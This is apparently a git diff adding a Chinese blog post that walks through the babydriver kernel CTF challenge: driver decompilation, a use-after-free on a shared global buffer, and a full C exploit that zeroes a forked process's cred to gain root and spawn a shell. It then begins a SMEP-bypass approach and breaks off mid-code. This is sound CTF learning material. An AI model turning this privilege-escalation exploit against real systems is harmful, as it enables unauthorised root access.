@@ -156,6 +156,221 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/kernel%20UAF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/17/kernel%20UAF/" class="post-title-link" itemprop="url">kernel UAF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-05-17 20:42:55" itemprop="dateCreated datePublished" datetime="2022-05-17T20:42:55+08:00">2022-05-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-06-04 23:13:57" itemprop="dateModified" datetime="2022-06-04T23:13:57+08:00">2022-06-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>10 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>babydriver 复现</strong></p>
+<p>首先使用 boot.sh 启动 kernel：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver ./boot.sh</span><br><span class="line">Could <span class="keyword">not</span> access KVM kernel <span class="keyword">module</span>: No such file <span class="keyword">or</span> directory</span><br><span class="line">qemu-system-x86_64: failed to initialize KVM: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure>
+<p>未能初始化 kvm，大概率是因为系统不支持虚拟化</p>
+<p>可以通过如下命令检查是否支持：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep <span class="string">&#x27;^flags.*(vmx|svm)&#x27;</span> /proc/cpuinfo </span><br></pre></td></tr></table></figure>
+<p>如果输出 NULL 则代表不支持，具体的解决措施网上都有</p>
+<p>然后用如下命令解压 rootfs.cpio：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv ../rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip ./rootfs.cpio.gz </span><br></pre></td></tr></table></figure>
+<ul>
+<li>PS：这个 rootfs.cpio 其实是个压缩包，不过它省略了后缀“.gz”，这里需要先改名后解压</li>
+</ul>
+<p>用如下命令进行提取：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio </span><br></pre></td></tr></table></figure>
+<p>先看看 init：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver cat init                            </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc # mount:挂载</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag # 设置文件所有者和文件关联组(只有root权限才能拿flag)</span><br><span class="line">chmod 400 flag </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 尖括号可以将数据从一个地方转移到另一个地方</span></span><br><span class="line">exec 0&lt;/dev/console # 将/dev/console设备,重定向为标准输入</span><br><span class="line">exec 1&gt;/dev/console # 将标准输出,重定向为/dev/console设备</span><br><span class="line">exec 2&gt;/dev/console # 将标准错误,重定向为/dev/console设备</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko # 添加了babydriver.ko驱动(可能有洞)</span><br><span class="line">chmod 777 /dev/babydev # babydev全权限</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot; # 打印一句话</span><br><span class="line">setsid cttyhack setuidgid 1000 sh # 设置用户ID(和权限相关)</span><br><span class="line"></span><br><span class="line">umount /proc # umount:取消挂载</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这个 babydev 是人为添加的一个文件，可以把它认为是一个虚拟外设（有点类似于键盘缓冲区之类的东西）</li>
+</ul>
+<p>一般 kernel pwn 都会在驱动函数那里设置漏洞，把它拿出来：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver checksec babydriver.ko </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/CISCN2017_babydriver/babydriver/babydriver.ko&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x0</span>)</span></span></span><br></pre></td></tr></table></figure>
+<p>用IDA分析 babydriver.ko：</p>
+<img src="/2022/05/17/kernel%20UAF/1652785739175-1653066925237.png" class width="1652785739175"> 
+<ul>
+<li>和上一个 kernel pwn 不同，这个 IDA 分析的还是很清楚的，原因就在于它没有去除符号表</li>
+</ul>
+<p>init_module：初始化模块</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &lt; <span class="number">0</span> ) <span class="comment">// 向内核申请设备号</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13alloc_chrdev_region failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cdev_init(&amp;cdev, &amp;fops); <span class="comment">// 初始化cdev结构体变量</span></span><br><span class="line">  qword_D60 = (__int64)&amp;_this_module;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)cdev_add(&amp;cdev, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">1LL</span>) &gt;= <span class="number">0</span> ) <span class="comment">// 向Linux内核系统中添加一个新的cdev结构体变量所描述的字符设备</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = _class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no); <span class="comment">// 创建一个设备类(有面向对象的味道)</span></span><br><span class="line">    babydev_class = v0;</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( device_create(v0, <span class="number">0LL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>) ) <span class="comment">// 创建对应的设备</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      printk(<span class="string">&quot;13create device failed&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      class_destroy(babydev_class); <span class="comment">// 删除对应的设备</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(<span class="string">&quot;13create class failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_del(&amp;cdev); <span class="comment">// 用于从Linux内核系统中移除cdev结构体变量所描述的字符设备</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13cdev init failed\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  unregister_chrdev_region((<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">1LL</span>); <span class="comment">// 释放原先申请的设备号</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>值得注意的是：该程序把“驱动函数”和“babydev”进行了绑定（申请了一个名为“babydev”的设备，该驱动文件 babydriver.ko 就是为设备“babydev”为生的）</li>
+</ul>
+<p>babyioctl：定义驱动函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyioctl</span><span class="params">(FILE *fp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 size; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(fp, command); <span class="comment">// 这里的fp是&quot;文件指针&quot;(fd是文件描述符)</span></span><br><span class="line">  size = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = _kmalloc(size, <span class="number">0x24000C0</span>LL);<span class="comment">// void *kmalloc(size_t size, int flags)</span></span><br><span class="line">    babydev_struct.device_buf_len = size;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13defalut:arg is %ld\n&quot;</span>, v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>定义了 0x10001 的命令：释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len </li>
+</ul>
+<p>babyopen：打开文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, fp);</span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>申请一块 64 字节的空间，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len </li>
+</ul>
+<p>babyread：读文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyread</span><span class="params">(FILE *fp, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(fp, buf);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; size )</span><br><span class="line">      copy_to_user(buf, babydev_struct.device_buf, size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>先检查 babydev_struct.device_buf 中是否有数据</li>
+<li>再检查用户申请的长度 size 是否大于 babydev_struct.device_buf</li>
+<li>然后调用 copy_to_user 把内核数据 babydev_struct.device_buf 拷贝到用户缓冲区 buf</li>
+</ul>
+<p>babywrite：写文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babywrite</span><span class="params">(FILE *fp, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(fp, buf);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; size )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, buf, size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>先检查 babydev_struct.device_buf 中是否有数据</li>
+<li>再检查用户申请的长度 size 是否大于 babydev_struct.device_buf</li>
+<li>然后调用 copy_from_user 把用户缓冲区 buf 拷贝到内核数据 babydev_struct.device_buf</li>
+</ul>
+<p>babyrelease：关闭文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, fp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>释放空间 </li>
+</ul>
+<p><strong>入侵思路</strong></p>
+<p>存在一个 <strong>伪条件竞争引发的UAF漏洞</strong>，即当我们同时打开两个设备，第二次会覆盖第一次分配的空间（因为 <code>babydev_struct</code> 是全局的），也就是说，两个设备共用了一个 <code>babydev_struct</code></p>
+<p>如果这时释放第一个，那么第二个其实是被释放过的，这样就造成了一个UAF，我们可以通过UAF修改 <code>cred</code> 结构体来提权</p>
+<p>那么根据 UAF 的思想，入侵步骤如下：</p>
+<ul>
+<li>打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小</li>
+<li>释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠</li>
+<li>同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root</li>
+</ul>
+<p>注意：fork() 在创建新进程时，会先 kmalloc 一个内存空间用于存放新进程的 cred，这时就会申请到我们可以控制的那片内存，从而修改 cred</p>
+<p>分析官方exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* gcc exp.c -static -masm=intel -g -o exp */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;stropts.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开两次设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>); <span class="comment">// 修改babydev_struct.device_buf_len为sizeof(cred)</span></span><br><span class="line">    close(fd1); <span class="comment">// 释放fd1</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork(); <span class="comment">// 新起进程的cred空间,会被申请到babydev_struct中</span></span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fork error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 通过更改fd2(操控babydev_struct),修改新进程的cred的uid,gid等值为&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>根据驱动函数：对文件描述符FD进行操作，就是直接控制“babydev_struct”，进而间接控制“cred”</li>
+</ul>
+<p><strong>bypass-smep</strong></p>
+<p>本题目还有另一种做法：绕过 smep 来实现 ret2usr（smep：当 CPU 处于 <code>ring0</code> 模式时，执行用户空间的代码会触发页错误）</p>
+<ul>
+<li>系统根据 CR4 寄存器的值判断是否开启 smep 保护 </li>
+<li>smep 开启：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$CR4 = <span class="number">0x1407f0</span> = <span class="number">10100</span> <span class="number">0000</span> <span class="number">0111</span> <span class="number">1111</span> <span class="number">0000</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>smep 关闭：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$CR4 = <span class="number">0x1407e0</span> = <span class="number">10100</span> <span class="number">0000</span> <span class="number">0111</span> <span class="number">1110</span> <span class="number">0000</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>而 CR4 寄存器是可以通过 mov 指令修改的：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov cr4, <span class="number">0x1407e0</span></span><br></pre></td></tr></table></figure>
+<p>先用 extract-vmlinux 获取 vmlinux：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver ./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
+<p>然后使用 Ropper 来寻找 gadget：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver time ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="keyword">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">ropper --file ./vmlinux --nocolor &gt; g1  <span class="number">234.87</span>s user <span class="number">32.60</span>s system <span class="number">139</span>% cpu <span class="number">3</span>:<span class="number">11.53</span> total</span><br></pre></td></tr></table></figure>
+<p>先写一个脚本来查找“commit_creds”和“prepare_kernel_cred”（没有开 PIE 和 Kaslr）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, 